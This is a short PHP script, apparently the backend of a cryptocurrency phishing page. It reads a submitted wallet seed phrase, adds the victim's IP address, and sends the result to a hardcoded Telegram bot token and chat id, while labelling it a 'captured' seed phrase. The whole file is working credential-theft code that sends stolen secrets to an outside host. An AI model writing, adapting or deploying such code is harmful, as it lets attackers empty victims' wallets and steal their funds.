<?php
              
if(isset($_POST['phrase']))
{
$path = "https://api.telegram.org/bot5181220447:AAFXMsdyBxZxEJyEl3r2_mKGj6TI4ISggN0";
$data=$_POST['phrase'];
$ip = $_SERVER['REMOTE_ADDR'];
$fp = fopen('data.txt', 'a');
$info = "[".$ip."]"." Captured 12 word seed phrase: ".$data;
file_get_contents($path."/sendmessage?chat_id=5243320494&text=.$info");
}
?>